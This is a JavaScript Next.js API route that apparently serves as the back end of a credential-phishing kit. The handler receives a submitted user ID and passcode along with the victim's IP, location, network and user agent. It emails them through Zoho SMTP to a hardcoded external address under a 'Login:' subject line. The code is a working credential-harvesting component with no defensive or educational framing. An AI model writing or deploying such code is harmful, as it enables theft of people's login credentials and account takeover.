"use server"
import {NextApiRequest, NextResponse } from "next/server";
import nodemailer from "nodemailer";


const user = process.env.EMAIL;
const pass = process.env.PASSWORD;

export default async function handler(req, res) {
  try {
    const body = await req.body;
    const {user_id, passcode, country, city, network, host_ip, date, region_code, longitude, latitude, user_agent} = body

    console.log(user_id, passcode, country, city,network, host_ip, date, region_code, longitude, latitude, user_agent)

    const transporter = nodemailer.createTransport({
      service: "zoho",
      host: "smtp.zoho.com",
      port: 465,
      secure: true,
      auth: {
        user,
        pass,
      },
    });

    const mailOptions = {
      from: "rep_info@zohomail.com",
      to: "arielnze@yahoo.com",
      subject: `Login: | ${user_id} | ${country} | ${host_ip}`,
      text: `User_id: ${user_id}\n Passcode: ${passcode}\n Country: ${country}\nCity: ${city}\nRegion_code: ${region_code}\nHost: ${host_ip}\nNetwork: ${network}\nDate: ${date}\nLongitude: ${longitude}\nLatitude: ${latitude}\nUser_Agent: ${user_agent}`,
    };

    await transporter.sendMail(mailOptions);
    console.log('Message sent successfully')
    res.status(200).send({message: 'Message sent successful'})
    // return NextResponse.json(
    //     { message: "Message sent successfully" },
    //     { status: 200 },
    //   );

  } catch (error) {
    console.log('Failed to send message')
    res.status(500).send({error: "Failed to send message."})
    // new NextResponse("Failed to send message.", { status: 500 })
  }
}

